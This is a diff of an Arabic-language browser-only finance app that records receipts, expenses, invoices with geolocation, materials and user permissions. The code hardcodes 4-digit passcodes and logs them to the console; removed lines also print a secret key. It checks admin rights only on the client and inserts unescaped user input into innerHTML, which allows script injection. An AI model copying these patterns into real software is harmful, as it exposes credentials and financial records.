-                tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; color:#5a6a5a;">لا توجد عمليات مسجلة</td></tr>';
+                tbody.innerHTML = `<tr><td colspan="10" class="text-center text-muted">لا توجد مصروفات مسجلة</td></tr>`;
                 return;
             }
-            tbody.innerHTML = transactions.map(t => `
+            tbody.innerHTML = transactions.map((t, i) => `
                 <tr>
+                    <td>${i+1}</td>
                     <td>${t.date}</td>
-                    <td>${t.type === 'receive' ? '📥 استلام' : t.type === 'disburse' ? '📤 تخريج' : '🧾 فاتورة'}</td>
-                    <td>${t.amount.toLocaleString()} ل.س</td>
+                    <td><span class="badge ${t.type === 'receive' ? 'badge-success' : 'badge-warning'}">${t.type === 'receive' ? '📥 استلام' : '📤 مصروف'}</span></td>
                     <td>${t.note || '---'}</td>
+                    <td>${t.amount.toLocaleString()} ل.س</td>
+                    <td>${t.image ? `<img src="${t.image}" class="img-thumb" onclick="window.open('${t.image}','_blank')" />` : '---'}</td>
                     <td>${t.location ? `<span class="location-tag">📍 ${t.location}</span>` : '---'}</td>
-                    <td><span class="badge ${t.status === 'pending' ? 'warning' : ''}">${t.status || 'مكتمل'}</span></td>
+                    <td>${t.phone || '---'}</td>
+                    <td>${t.remarks || '---'}</td>
+                    <td>
+                        ${currentUser.role === 'admin' ? `
+                            <button class="action-btn action-btn-edit" onclick="editTransaction(${i})">✏️</button>
+                            <button class="action-btn action-btn-delete" onclick="deleteTransaction(${i})">🗑️</button>
+                        ` : '---'}
+                    </td>
+                </tr>
+            `).join('');
+        }
+
+        function renderMaterials() {
+            const tbody = document.getElementById('materialsBody');
+            if (materials.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="4" class="text-center text-muted">لا توجد مواد مسجلة</td></tr>`;
+                return;
+            }
+            tbody.innerHTML = materials.map((m, i) => `
+                <tr>
+                    <td>${i+1}</td>
+                    <td>${m.name}</td>
+                    <td>${m.price.toLocaleString()} ل.س</td>
+                    <td>
+                        ${currentUser.role === 'admin' ? `
+                            <button class="action-btn action-btn-edit" onclick="editMaterial(${m.id})">✏️</button>
+                            <button class="action-btn action-btn-delete" onclick="deleteMaterial(${m.id})">🗑️</button>
+                        ` : '---'}
+                    </td>
                 </tr>
             `).join('');
         }
 
         // =====================================================
-        // 6. دوال المودال
+        // 5. المودال (نوافذ منبثقة)
         // =====================================================
         function openModal(type) {
             const modal = document.getElementById('modal');
             const title = document.getElementById('modalTitle');
             const body = document.getElementById('modalBody');
 
-            // التحقق من صلاحية المستخدم للدخول إلى الإدارة
-            if ((type === 'admin' || type === 'addUser' || type === 'permissions') && currentUser.role !== 'admin') {
-                logAlert('محاولة الوصول إلى إدارة النظام بدون صلاحية');
+            if (['admin', 'addUser', 'permissions', 'materials'].includes(type) && currentUser.role !== 'admin') {
                 alert('⚠️ هذا الإجراء غير مسموح به لصلاحياتك!');
                 return;
             }
 
             if (type === 'receive') {
-                title.textContent = '📥 استقبال مبلغ مالي';
+                title.textContent = '📥 استقبال مبلغ مالي للشهر';
                 body.innerHTML = `
-                    <label>المبلغ (ل.س)</label>
-                    <input type="number" id="amountInput" placeholder="أدخل المبلغ">
+                    <label>المبلغ المستلم (ل.س)</label>
+                    <input type="number" id="receiveAmount" placeholder="أدخل المبلغ المستلم لهذا الشهر">
                     <label>البيان</label>
-                    <input type="text" id="noteInput" placeholder="مصدر المبلغ">
+                    <input type="text" id="receiveNote" placeholder="مصدر المبلغ (مثال: مخصصات الشهر)">
+                    <label>الشهر</label>
+                    <select id="receiveMonth">
+                        ${Array.from({length:12}, (_,i) => `<option value="${i+1}" ${i+1===currentMonth?'selected':''}>الشهر ${i+1}</option>`).join('')}
+                    </select>
                 `;
                 document.getElementById('modalConfirm').onclick = function() {
-                    const amount = parseFloat(document.getElementById('amountInput').value);
-                    const note = document.getElementById('noteInput').value || 'استلام مالي';
-                    if (isNaN(amount) || amount <= 0) {
-                        alert('يرجى إدخال مبلغ صحيح');
-                        return;
-                    }
+                    const amt = parseFloat(document.getElementById('receiveAmount').value);
+                    const note = document.getElementById('receiveNote').value || 'استلام شهري';
+                    const month = parseInt(document.getElementById('receiveMonth').value);
+                    if (isNaN(amt) || amt <= 0) { alert('يرجى إدخال مبلغ صحيح'); return; }
                     transactions.push({
                         date: new Date().toLocaleString('ar-EG'),
                         type: 'receive',
-                        amount: amount,
-                        note: note,
+                        amount: amt,
+                        note: `${note} (الشهر ${month})`,
+                        image: null,
                         location: userLocation ? `${userLocation.lat}, ${userLocation.lon}` : null,
-                        status: 'مكتمل',
-                        user: currentUser.name
+                        phone: null,
+                        remarks: `شهر ${month}`,
+                        user: currentUser.name,
+                        month: month
                     });
+                    monthlyReceived += amt;
                     updateStats();
                     renderTransactions();
                     closeModal();
                 };
             } else if (type === 'disburse') {
-                title.textContent = '📤 تخريج مبلغ مع فاتورة';
+                title.textContent = '📤 إضافة مصروف جديد';
                 body.innerHTML = `
-                    <label>المبلغ (ل.س)</label>
-                    <input type="number" id="disburseAmount" placeholder="أدخل المبلغ">
-                    <label>نوع المصروف</label>
-                    <select id="expenseType">
-                        <option value="ماكولات وشراب">ماكولات وشراب</option>
-                        <option value="الكترونيات">الكترونيات</option>
-                        <option value="تعويضات">تعويضات</option>
-                        <option value="صيانة">صيانة</option>
-                        <option value="نفقات شخصية">نفقات شخصية</option>
-                        <option value="فواتير شراء">فواتير شراء</option>
-                        <option value="أخرى">أخرى</option>
+                    <label>المادة/المصروف</label>
+                    <select id="expenseMaterial">
+                        ${materials.map(m => `<option value="${m.id}">${m.name} (${m.price.toLocaleString()} ل.س)</option>`).join('')}
+                        <option value="other">أخرى (أدخل يدوياً)</option>
                     </select>
-                    <label>وصف الفاتورة</label>
-                    <textarea id="invoiceNote" placeholder="تفاصيل الفاتورة"></textarea>
+                    <div id="customMaterialDiv" class="hidden">
+                        <label>اسم المادة الجديدة</label>
+                        <input type="text" id="customMaterialName" placeholder="أدخل اسم المادة">
+                    </div>
+                    <label>المبلغ (ل.س)</label>
+                    <input type="number" id="expenseAmount" placeholder="أدخل المبلغ">
+                    <label>الوصف</label>
+                    <input type="text" id="expenseNote" placeholder="تفاصيل المصروف">
+                    <label>رابط الصورة (اختياري)</label>
+                    <input type="text" id="expenseImage" placeholder="https://example.com/invoice.jpg">
+                    <label>رقم الهاتف</label>
+                    <input type="text" id="expensePhone" placeholder="رقم هاتف المحل أو المورد">
+                    <label>ملاحظات</label>
+                    <textarea id="expenseRemarks" placeholder="ملاحظات إضافية"></textarea>
                 `;
                 document.getElementById('modalConfirm').onclick = function() {
-                    const amount = parseFloat(document.getElementById('disburseAmount').value);
-                    const type = document.getElementById('expenseType').value;
-                    const note = document.getElementById('invoiceNote').value || 'فاتورة';
-                    if (isNaN(amount) || amount <= 0) {
-                        alert('يرجى إدخال مبلغ صحيح');
+                    const matSelect = document.getElementById('expenseMaterial');
+                    let matId = parseInt(matSelect.value);
+                    let amount = parseFloat(document.getElementById('expenseAmount').value);
+                    const note = document.getElementById('expenseNote').value || 'مصروف';
+                    const image = document.getElementById('expenseImage').value || null;
+                    const phone = document.getElementById('expensePhone').value || null;
+                    const remarks = document.getElementById('expenseRemarks').value || null;
+
+                    if (matId === 'other' || isNaN(matId)) {
+                        const customName = document.getElementById('customMaterialName').value.trim();
+                        if (!customName) { alert('يرجى إدخال اسم المادة'); return; }
+                        const newMat = { id: nextMaterialId++, name: customName, price: amount || 0 };
+                        materials.push(newMat);
+                        matId = newMat.id;
+                        renderMaterials();
+                    } else {
+                        const mat = materials.find(m => m.id === matId);
+                        if (mat && amount === 0) amount = mat.price;
+                    }
+
+                    if (isNaN(amount) || amount <= 0) { alert('يرجى إدخال مبلغ صحيح'); return; }
+
+                    const totalReceived = transactions.filter(t => t.type === 'receive').reduce((s, t) => s + t.amount, 0);
+                    const totalExpenses = transactions.filter(t => t.type === 'expense').reduce((s, t) => s + t.amount, 0);
+                    if (amount > (totalReceived - totalExpenses)) {
+                        alert(`⚠️ الرصيد المتاح: ${(totalReceived - totalExpenses).toLocaleString()} ل.س`);
                         return;
                     }
-                    const total = transactions.reduce((sum, t) => sum + (t.type === 'receive' ? t.amount : -t.amount), 0);
-                    if (amount > total) {
-                        logAlert(`محاولة تخريج مبلغ (${amount}) يتجاوز الرصيد المتاح (${total})`);
-                        alert('⚠️ لا يمكن التخريج لأن المبلغ يتجاوز الرصيد المتاح!');
-                        return;
-                    }
+
+                    const matName = materials.find(m => m.id === matId)?.name || 'مادة غير معروفة';
                     transactions.push({
                         date: new Date().toLocaleString('ar-EG'),
-                        type: 'disburse',
-                        amount: -amount,
-                        note: `${type}: ${note}`,
+                        type: 'expense',
+                        amount: amount,
+                        note: `${matName}: ${note}`,
+                        image: image,
                         location: userLocation ? `${userLocation.lat}, ${userLocation.lon}` : null,
-                        status: 'مكتمل',
-                        user: currentUser.name
+                        phone: phone,
+                        remarks: remarks,
+                        user: currentUser.name,
+                        materialId: matId
                     });
                     updateStats();
                     renderTransactions();
                     closeModal();
                 };
+
+                // إظهار/إخفاء حقل المادة المخصصة
+                document.getElementById('expenseMaterial').addEventListener('change', function() {
+                    document.getElementById('customMaterialDiv').classList.toggle('hidden', this.value !== 'other');
+                });
             } else if (type === 'invoice') {
-                title.textContent = '🧾 رفع فاتورة + تحديد الموقع';
+                title.textContent = '🧾 رفع فاتورة مع الموقع';
                 body.innerHTML = `
                     <label>المبلغ (ل.س)</label>
                     <input type="number" id="invoiceAmount" placeholder="أدخل المبلغ">
                     <label>وصف الفاتورة</label>
                     <textarea id="invoiceDesc" placeholder="تفاصيل الفاتورة"></textarea>
-                    <label>صورة الفاتورة (رابط)</label>
+                    <label>رابط الصورة</label>
                     <input type="text" id="invoiceImage" placeholder="https://example.com/invoice.jpg">
-                    <label>موقع المحل (يتم تحديده تلقائياً)</label>
-                    <input type="text" id="invoiceLocation" placeholder="سيتم جلب الموقع تلقائياً" readonly>
-                    <button onclick="getCurrentLocationForInvoice()" class="action-btn primary" style="margin-top:10px;">📍 جلب الموقع الحالي</button>
+                    <label>رقم الهاتف</label>
+                    <input type="text" id="invoicePhone" placeholder="رقم هاتف المورد">
+                    <label>الموقع (سيتم جلب الموقع تلقائياً)</label>
+                    <input type="text" id="invoiceLocation" readonly>
+                    <button class="btn btn-primary" onclick="getCurrentLocation()" style="margin-top:10px;">📍 جلب الموقع الحالي</button>
                 `;
                 document.getElementById('modalConfirm').onclick = function() {
-                    const amount = parseFloat(document.getElementById('invoiceAmount').value);
+                    const amt = parseFloat(document.getElementById('invoiceAmount').value);
                     const desc = document.getElementById('invoiceDesc').value || 'فاتورة';
-                    const image = document.getElementById('invoiceImage').value || 'لا يوجد';
-                    const location = document.getElementById('invoiceLocation').value || (userLocation ? `${userLocation.lat}, ${userLocation.lon}` : 'غير محدد');
-                    
-                    if (isNaN(amount) || amount <= 0) {
-                        alert('يرجى إدخال مبلغ صحيح');
-                        return;
-                    }
-                    
+                    const image = document.getElementById('invoiceImage').value || null;
+                    const phone = document.getElementById('invoicePhone').value || null;
+                    const loc = document.getElementById('invoiceLocation').value || (userLocation ? `${userLocation.lat}, ${userLocation.lon}` : null);
+                    if (isNaN(amt) || amt <= 0) { alert('يرجى إدخال مبلغ صحيح'); return; }
                     transactions.push({
                         date: new Date().toLocaleString('ar-EG'),
-                        type: 'invoice',
-                        amount: amount,
-                        note: `📎 ${desc} | 🖼️ ${image}`,
-                        location: location,
-                        status: 'مكتمل',
+                        type: 'expense',
+                        amount: amt,
+                        note: `🧾 ${desc}`,
+                        image: image,
+                        location: loc,
+                        phone: phone,
+                        remarks: 'فاتورة',
                         user: currentUser.name
                     });
                     updateStats();
@@ -691,39 +527,20 @@
                     closeModal();
                 };
             } else if (type === 'admin') {
-                title.textContent = '⚙️ إدارة القطعات المالية';
+                title.textContent = '⚙️ لوحة تحكم المدير';
                 body.innerHTML = `
-                    <label>اختر قطعة</label>
-                    <select id="unitSelect">
-                        <option value="1">القطعة 1 - حلب</option>
-                        <option value="2">القطعة 2 - حمص</option>
-                        <option value="3">القطعة 3 - اللاذقية</option>
-                        <option value="4">القطعة 4 - حماة</option>
-                        <option value="5" selected>القطعة 5 - دير الزور</option>
-                    </select>
-                    <label>الإجراء</label>
-                    <select id="adminAction">
-                        <option value="view">عرض البيانات</option>
-                        <option value="edit">تعديل بيانات</option>
-                        <option value="delete">حذف عملية</option>
-                    </select>
-                    <label>تفاصيل إضافية</label>
-                    <input type="text" id="adminNote" placeholder="ملاحظات">
+                    <p style="color:#8a9a8a;margin-bottom:10px;">إدارة عامة للنظام</p>
+                    <div class="grid-2">
+                        <button class="btn btn-primary" onclick="closeModal();openModal('materials')">📦 إدارة المواد</button>
+                        <button class="btn btn-primary" onclick="closeModal();openModal('addUser')">➕ إضافة مستخدم</button>
+                        <button class="btn btn-primary" onclick="closeModal();openModal('permissions')">🔑 صلاحيات</button>
+                        <button class="btn btn-danger" onclick="resetSystem()">🔄 إعادة تعيين النظام</button>
+                    </div>
+                    <label style="margin-top:15px;">إجمالي المستخدمين: ${Object.keys(users).length}</label>
+                    <label>إجمالي العمليات: ${transactions.length}</label>
                 `;
-                document.getElementById('modalConfirm').onclick = function() {
-                    const unit = document.getElementById('unitSelect').value;
-                    const action = document.getElementById('adminAction').value;
-                    const note = document.getElementById('adminNote').value || '---';
-                    alert(`✅ تم تنفيذ الإجراء: ${action} على القطعة ${unit}\nالملاحظات: ${note}`);
-                    alerts.push({
-                        date: new Date().toLocaleString('ar-EG'),
-                        user: currentUser.name,
-                        action: `إدارة: ${action} على القطعة ${unit}`,
-                        note: note
-                    });
-                    updateStats();
-                    closeModal();
-                };
+                document.getElementById('modalConfirm').style.display = 'none';
+                document.querySelector('.modal-actions .btn-secondary').textContent = 'إغلاق';
             } else if (type === 'addUser') {
                 title.textContent = '➕ إضافة مستخدم جديد';
                 body.innerHTML = `
@@ -734,228 +551,225 @@
                     <label>الموقع</label>
                     <input type="text" id="newLocation" placeholder="مثال: دير الزور">
                     <label>الدور</label>
-                    <select id="newRole">
-                        <option value="user">مستخدم عادي</option>
-                        <option value="admin">مدير</option>
-                    </select>
-                    <label>الصلاحيات (اختر ما يناسب)</label>
+                    <select id="newRole"><option value="user">مستخدم عادي</option><option value="admin">مدير</option></select>
+                    <label>الصلاحيات</label>
                     <select id="newPermissions" multiple style="height:100px;">
-                        <option value="receive">📥 استقبال مبلغ</option>
-                        <option value="disburse">📤 تخريج مبلغ</option>
-                        <option value="invoice">🧾 رفع فاتورة + موقع</option>
-                        <option value="view">📋 عرض السجل</option>
+                        <option value="receive">📥 استقبال</option>
+                        <option value="disburse">📤 مصروفات</option>
+                        <option value="invoice">🧾 فاتورة</option>
+                        <option value="view">📋 عرض</option>
                     </select>
                     <small style="color:#8a9a8a;">اضغط Ctrl+اختيار لتحديد عدة صلاحيات</small>
                 `;
                 document.getElementById('modalConfirm').onclick = function() {
                     const pass = document.getElementById('newPass').value.trim();
                     const name = document.getElementById('newName').value.trim();
-                    const location = document.getElementById('newLocation').value.trim();
+                    const loc = document.getElementById('newLocation').value.trim();
                     const role = document.getElementById('newRole').value;
-                    const permsSelect = document.getElementById('newPermissions');
-                    const perms = Array.from(permsSelect.selectedOptions).map(opt => opt.value);
-
-                    if (!pass || !name || !location) {
-                        alert('يرجى ملء جميع الحقول');
-                        return;
-                    }
-                    if (users[pass]) {
-                        alert('كلمة المرور مستخدمة بالفعل');
-                        return;
-                    }
-                    if (pass.length !== 4 || isNaN(pass)) {
-                        alert('كلمة المرور يجب أن تكون 4 أرقام');
-                        return;
-                    }
-                    if (perms.length === 0) {
-                        alert('يرجى اختيار صلاحية واحدة على الأقل');
-                        return;
-                    }
-
-                    users[pass] = {
-                        role: role,
-                        name: name,
-                        location: location,
-                        id: Object.keys(users).length + 1
-                    };
-
+                    const perms = Array.from(document.getElementById('newPermissions').selectedOptions).map(o => o.value);
+                    if (!pass || !name || !loc || perms.length === 0) { alert('يرجى ملء جميع الحقول واختيار صلاحية'); return; }
+                    if (users[pass]) { alert('كلمة المرور مستخدمة'); return; }
+                    if (pass.length !== 4 || isNaN(pass)) { alert('كلمة المرور يجب أن تكون 4 أرقام'); return; }
+                    users[pass] = { role, name, location: loc, id: Object.keys(users).length + 1 };
                     USER_PERMISSIONS[pass] = perms;
-
-                    alert(`✅ تم إضافة المستخدم ${name} بنجاح مع ${perms.length} صلاحية`);
+                    alert(`✅ تم إضافة ${name} بنجاح`);
                     closeModal();
-                    console.log('👥 المستخدمون الحاليون:', Object.keys(users));
-                    console.log('🔑 الصلاحيات:', USER_PERMISSIONS);
                 };
             } else if (type === 'permissions') {
-                title.textContent = '🔑 صلاحيات المستخدمين';
-                let html = `<label>اختر مستخدم لتعديل صلاحياته</label>
-                            <select id="userSelect" onchange="loadUserPermissions()">
-                                <option value="">-- اختر مستخدم --</option>`;
-                Object.keys(users).forEach(pass => {
-                    html += `<option value="${pass}">${users[pass].name} (${pass})</option>`;
+                title.textContent = '🔑 إدارة الصلاحيات';
+                let html = `<label>اختر مستخدم</label><select id="userSelect" onchange="loadUserPerms()">
+                    <option value="">-- اختر --</option>`;
+                Object.keys(users).forEach(p => {
+                    html += `<option value="${p}">${users[p].name} (${p})</option>`;
                 });
-                html += `</select>
-                        <div id="permsContainer" style="margin-top:15px;">
-                            <p style="color:#8a9a8a;">اختر مستخدم لعرض صلاحياته</p>
-                        </div>`;
+                html += `</select><div id="permsContainer" style="margin-top:15px;"><p class="text-muted">اختر مستخدم لعرض صلاحياته</p></div>`;
                 body.innerHTML = html;
                 document.getElementById('modalConfirm').style.display = 'none';
-                document.querySelector('.modal-actions .btn-cancel').textContent = 'إغلاق';
+                document.querySelector('.modal-actions .btn-secondary').textContent = 'إغلاق';
+            } else if (type === 'materials') {
+                title.textContent = '📦 إدارة المواد والمصروفات';
+                body.innerHTML = `
+                    <label>اسم المادة الجديدة</label>
+                    <input type="text" id="newMaterialName" placeholder="مثال: قرطاسية">
+                    <label>السعر الافتراضي</label>
+                    <input type="number" id="newMaterialPrice" placeholder="0">
+                    <button class="btn btn-primary" onclick="addMaterial()" style="margin-top:10px;">➕ إضافة مادة</button>
+                    <hr style="border-color:#2a4a4a;margin:15px 0;">
+                    <div id="materialsList"></div>
+                `;
+                document.getElementById('modalConfirm').style.display = 'none';
+                document.querySelector('.modal-actions .btn-secondary').textContent = 'إغلاق';
+                renderMaterialsModal();
             }
             modal.classList.add('active');
         }
 
-        // ====== دالة تحميل صلاحيات المستخدم ======
-        function loadUserPermissions() {
+        // ====== دوال المواد ======
+        function addMaterial() {
+            const name = document.getElementById('newMaterialName').value.trim();
+            const price = parseFloat(document.getElementById('newMaterialPrice').value) || 0;
+            if (!name) { alert('يرجى إدخال اسم المادة'); return; }
+            materials.push({ id: nextMaterialId++, name, price });
+            renderMaterialsModal();
+            renderMaterials();
+            document.getElementById('newMaterialName').value = '';
+            document.getElementById('newMaterialPrice').value = '';
+            alert('✅ تم إضافة المادة بنجاح');
+        }
+
+        function renderMaterialsModal() {
+            const container = document.getElementById('materialsList');
+            if (materials.length === 0) {
+                container.innerHTML = '<p class="text-muted">لا توجد مواد مسجلة</p>';
+                return;
+            }
+            container.innerHTML = materials.map(m => `
+                <div class="flex-between" style="padding:8px 0;border-bottom:1px solid #1a2a2a;">
+                    <span>${m.name} (${m.price.toLocaleString()} ل.س)</span>
+                    <div>
+                        <button class="action-btn action-btn-edit" onclick="editMaterial(${m.id})">✏️</button>
+                        <button class="action-btn action-btn-delete" onclick="deleteMaterial(${m.id})">🗑️</button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function editMaterial(id) {
+            const m = materials.find(x => x.id === id);
+            if (!m) return;
+            const newName = prompt('اسم المادة:', m.name);
+            if (newName !== null && newName.trim()) m.name = newName.trim();
+            const newPrice = prompt('السعر:', m.price);
+            if (newPrice !== null && !isNaN(parseFloat(newPrice))) m.price = parseFloat(newPrice);
+            renderMaterialsModal();
+            renderMaterials();
+        }
+
+        function deleteMaterial(id) {
+            if (!confirm('هل أنت متأكد من حذف هذه المادة؟')) return;
+            materials = materials.filter(m => m.id !== id);
+            renderMaterialsModal();
+            renderMaterials();
+        }
+
+        // ====== دوال الصلاحيات ======
+        function loadUserPerms() {
             const pass = document.getElementById('userSelect').value;
             if (!pass) return;
-            
             const perms = USER_PERMISSIONS[pass] || [];
             const user = users[pass];
-            
             const container = document.getElementById('permsContainer');
             container.innerHTML = `
-                <div style="background:#1a2a2a;padding:15px;border-radius:12px;">
-                    <p><strong>👤 ${user.name}</strong> (${user.location})</p>
-                    <p style="color:#8a9a8a;font-size:14px;">صلاحياته الحالية:</p>
+                <div style="background:#0a1a1a;padding:15px;border-radius:12px;">
+                    <p><strong>${user.name}</strong> (${user.location})</p>
+                    <p class="text-muted">الصلاحيات الحالية:</p>
                     <ul style="color:#c9d4c9;list-style:none;padding:0;">
-                        ${perms.map(p => `<li style="padding:4px 0;">✅ ${p}</li>`).join('') || '<li style="color:#5a6a5a;">لا توجد صلاحيات</li>'}
+                        ${perms.map(p => `<li>✅ ${p}</li>`).join('') || '<li style="color:#5a6a5a;">لا توجد صلاحيات</li>'}
                     </ul>
-                    <label style="margin-top:12px;">تعديل الصلاحيات</label>
-                    <select id="editPermissions" multiple style="height:120px;width:100%;">
-                        <option value="receive" ${perms.includes('receive') ? 'selected' : ''}>📥 استقبال مبلغ</option>
-                        <option value="disburse" ${perms.includes('disburse') ? 'selected' : ''}>📤 تخريج مبلغ</option>
-                        <option value="invoice" ${perms.includes('invoice') ? 'selected' : ''}>🧾 رفع فاتورة + موقع</option>
-                        <option value="view" ${perms.includes('view') ? 'selected' : ''}>📋 عرض السجل</option>
+                    <select id="editPerms" multiple style="height:120px;width:100%;margin-top:10px;">
+                        <option value="receive" ${perms.includes('receive')?'selected':''}>📥 استقبال</option>
+                        <option value="disburse" ${perms.includes('disburse')?'selected':''}>📤 مصروفات</option>
+                        <option value="invoice" ${perms.includes('invoice')?'selected':''}>🧾 فاتورة</option>
+                        <option value="view" ${perms.includes('view')?'selected':''}>📋 عرض</option>
                     </select>
-                    <button onclick="updatePermissions('${pass}')" class="action-btn primary" style="margin-top:10px;width:100%;">💾 حفظ التغييرات</button>
+                    <button class="btn btn-primary" onclick="savePerms('${pass}')" style="margin-top:10px;width:100%;">💾 حفظ</button>
                 </div>
             `;
         }
 
-        // ====== دالة تحديث الصلاحيات ======
-        function updatePermissions(pass) {
-            const select = document.getElementById('editPermissions');
-            const perms = Array.from(select.selectedOptions).map(opt => opt.value);
-            
-            if (perms.length === 0) {
-                alert('يجب اختيار صلاحية واحدة على الأقل');
-                return;
-            }
-            
+        function savePerms(pass) {
+            const perms = Array.from(document.getElementById('editPerms').selectedOptions).map(o => o.value);
+            if (perms.length === 0) { alert('يجب اختيار صلاحية واحدة على الأقل'); return; }
             USER_PERMISSIONS[pass] = perms;
-            alert(`✅ تم تحديث صلاحيات ${users[pass].name} بنجاح`);
-            
-            // إعادة تحميل الصلاحيات المعروضة
-            loadUserPermissions();
+            alert('✅ تم حفظ الصلاحيات');
+            loadUserPerms();
         }
 
-        function closeModal() {
-            document.getElementById('modal').classList.remove('active');
-            document.getElementById('modalConfirm').style.display = 'block';
-            document.querySelector('.modal-actions .btn-cancel').textContent = 'إلغاء';
+        // ====== دوال المعاملات ======
+        function editTransaction(index) {
+            const t = transactions[index];
+            if (!t) return;
+            const newNote = prompt('تعديل الوصف:', t.note);
+            if (newNote !== null && newNote.trim()) t.note = newNote.trim();
+            const newAmount = prompt('تعديل المبلغ:', t.amount);
+            if (newAmount !== null && !isNaN(parseFloat(newAmount))) t.amount = parseFloat(newAmount);
+            renderTransactions();
+            updateStats();
         }
 
-        // ====== دالة جلب الموقع للفاتورة ======
-        function getCurrentLocationForInvoice() {
+        function deleteTransaction(index) {
+            if (!confirm('هل أنت متأكد من حذف هذه العملية؟')) return;
+            transactions.splice(index, 1);
+            renderTransactions();
+            updateStats();
+        }
+
+        function resetSystem() {
+            if (!confirm('⚠️ هل أنت متأكد من إعادة تعيين جميع البيانات؟')) return;
+            if (!confirm('تأكيد نهائي: سيتم حذف جميع العمليات والمواد المضافة!')) return;
+            transactions = [];
+            materials = [
+                { id: 1, name: 'ماكولات وشراب', price: 0 },
+                { id: 2, name: 'شراء اغراض', price: 0 },
+                { id: 3, name: 'مصروف شخصي', price: 0 },
+                { id: 4, name: 'كهرباء', price: 0 },
+                { id: 5, name: 'صحية', price: 0 },
+                { id: 6, name: 'صيانة', price: 0 }
+            ];
+            nextMaterialId = 7;
+            monthlyReceived = 0;
+            updateStats();
+            renderTransactions();
+            renderMaterials();
+            alert('✅ تم إعادة تعيين النظام');
+            closeModal();
+        }
+
+        // ====== الموقع ======
+        function getCurrentLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        const loc = `${position.coords.latitude}, ${position.coords.longitude}`;
-                        document.getElementById('invoiceLocation').value = loc;
-                        alert('✅ تم جلب الموقع بنجاح');
+                    function(pos) {
+                        document.getElementById('invoiceLocation').value = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+                        alert('✅ تم جلب الموقع');
                     },
-                    function(error) {
-                        alert('⚠️ فشل جلب الموقع، الرجاء إدخاله يدوياً');
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    function() { alert('⚠️ فشل جلب الموقع، أدخل يدوياً'); }
                 );
             } else {
                 alert('⚠️ متصفحك لا يدعم تحديد الموقع');
             }
         }
 
-        // =====================================================
-        // 7. دوال التلاعب والمراقبة
-        // =====================================================
-        function logAlert(message) {
-            const alertMsg = {
-                date: new Date().toLocaleString('ar-EG'),
-                user: currentUser.name,
-                location: currentUser.location,
-                message: message
-            };
-            alerts.push(alertMsg);
-            document.getElementById('alertBanner').style.display = 'block';
-            document.getElementById('alertBanner').textContent = 
-                `⚠️ ${message} | المستخدم: ${currentUser.name} (${currentUser.location})`;
-            setTimeout(() => {
-                document.getElementById('alertBanner').style.display = 'none';
-            }, 5000);
-            updateStats();
-            console.log('🔴 تنبيه تلاعب:', alertMsg);
-        }
-
+        // ====== عرض العمليات ======
         function viewTransactions() {
-            if (currentUser.role === 'admin') {
-                let msg = '📋 جميع العمليات المسجلة:\n\n';
-                transactions.forEach((t, i) => {
-                    msg += `${i+1}. ${t.date} | ${t.type === 'receive' ? '📥' : t.type === 'disburse' ? '📤' : '🧾'} | ${Math.abs(t.amount)} ل.س | ${t.note} | ${t.location || 'بدون موقع'}\n`;
-                });
-                msg += `\n📊 إجمالي العمليات: ${transactions.length}`;
-                alert(msg);
-            } else {
-                let msg = '📋 عملياتك المسجلة:\n\n';
-                const myT = transactions.filter(t => t.user === currentUser.name);
-                if (myT.length === 0) {
-                    alert('لا توجد عمليات مسجلة لك');
-                    return;
-                }
-                myT.forEach((t, i) => {
-                    msg += `${i+1}. ${t.date} | ${t.type === 'receive' ? '📥' : t.type === 'disburse' ? '📤' : '🧾'} | ${Math.abs(t.amount)} ل.س | ${t.note}\n`;
-                });
-                alert(msg);
-            }
+            let msg = '📋 جميع العمليات:\n\n';
+            transactions.forEach((t, i) => {
+                msg += `${i+1}. ${t.date} | ${t.type === 'receive' ? '📥' : '📤'} | ${t.amount} ل.س | ${t.note} | ${t.location || 'بدون موقع'}\n`;
+            });
+            msg += `\n📊 المجموع: ${transactions.length} عملية`;
+            alert(msg);
         }
 
-        function logout() {
-            currentUser = null;
-            document.getElementById('mainApp').style.display = 'none';
-            document.getElementById('loginScreen').style.display = 'block';
-            document.getElementById('loginPass').value = '';
+        // ====== إغلاق المودال ======
+        function closeModal() {
+            document.getElementById('modal').classList.remove('active');
+            document.getElementById('modalConfirm').style.display = 'block';
+            document.querySelector('.modal-actions .btn-secondary').textContent = 'إلغاء';
         }
 
-        // =====================================================
-        // 8. مراقبة التلاعب
-        // =====================================================
-        document.addEventListener('click', function(e) {
-            if (!currentUser) return;
-            if (currentUser.role === 'user') {
-                if (e.target.closest('#adminBtn') || e.target.closest('#addUserBtn') || e.target.closest('#permissionsBtn')) {
-                    logAlert('محاولة الوصول إلى إدارة النظام بدون صلاحية');
-                    alert('⚠️ هذا الإجراء غير مسموح به لصلاحياتك!');
-                    e.preventDefault();
-                }
-            }
-        });
-
+        // ====== منع التلاعب ======
         document.addEventListener('keydown', function(e) {
             if (currentUser && currentUser.role === 'user') {
                 if (e.key === 'F12' || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
-                    logAlert('محاولة فتح أدوات المطور');
+                    alert('⚠️ هذا الإجراء غير مسموح');
                     e.preventDefault();
                 }
             }
         });
 
-        console.log('✅ النظام المالي جاهز مع صلاحيات مخصصة');
-        console.log('🔑 المستخدمون:');
-        console.log('  1234 = مالي القطعة 5 (استقبال + تخريج + عرض)');
-        console.log('  1111 = مالي القطعة 1 (استقبال + عرض)');
-        console.log('  2222 = مالي القطعة 2 (تخريج + فاتورة + عرض)');
-        console.log('  3333 = مالي القطعة 3 (فاتورة + عرض)');
-        console.log('  1992 = مدير الوزارة (كل الصلاحيات)');
-        console.log('🔐 المفتاح السري: 9x7kLpQw2RzT4nM8vBcF');
+        // ====== التشغيل الابتدائي ======
+        console.log('✅ النظام المالي المتقدم جاهز');
+        console.log('🔑 1234=مستخدم | 1111=مستخدم2 | 2222=مستخدم3 | 3333=مستخدم4 | 1992=مدير');
     </script>
 
 </body>
